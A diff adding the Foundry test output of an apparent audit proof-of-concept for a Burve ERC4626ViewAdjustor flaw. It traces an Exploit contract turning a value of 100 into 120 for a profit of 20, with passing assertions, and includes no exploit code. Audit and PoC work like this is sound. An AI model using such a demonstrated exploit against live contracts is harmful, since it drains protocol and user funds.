@@ -1,0 +1,42 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/56951-burve-incorrect-implementation-of-erc4626viewadjustor_exp.sol:Finding56951Test
+[PASS] testFinding56951() (gas: 297616)
+Logs:
+  before: 100
+  after: 120
+  delta: 20
+
+Traces:
+  [297616] Finding56951Test::testFinding56951()
+    ├─ [160806] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 803 bytes of code
+    ├─ [89221] Exploit::run()
+    │   ├─  storage changes:
+    │   │   @ 2: 0 → 20
+    │   │   @ 1: 0 → 120
+    │   │   @ 3: 0 → 1
+    │   │   @ 0: 0 → 100
+    │   └─ ← [Stop]
+    ├─ [490] Exploit::beforeValue() [staticcall]
+    │   └─ ← [Return] 100
+    ├─ emit log_named_uint(key: "before", val: 100)
+    ├─ [425] Exploit::afterValue() [staticcall]
+    │   └─ ← [Return] 120
+    ├─ emit log_named_uint(key: "after", val: 120)
+    ├─ [447] Exploit::profit() [staticcall]
+    │   └─ ← [Return] 20
+    ├─ emit log_named_uint(key: "delta", val: 20)
+    ├─ [444] Exploit::stateDiverged() [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true) [staticcall]
+    │   └─ ← [Return]
+    ├─ [447] Exploit::profit() [staticcall]
+    │   └─ ← [Return] 20
+    ├─ [0] VM::assertGt(20, 0) [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 463.75µs (240.46µs CPU time)
+
+Ran 1 test suite in 58.47ms (463.75µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
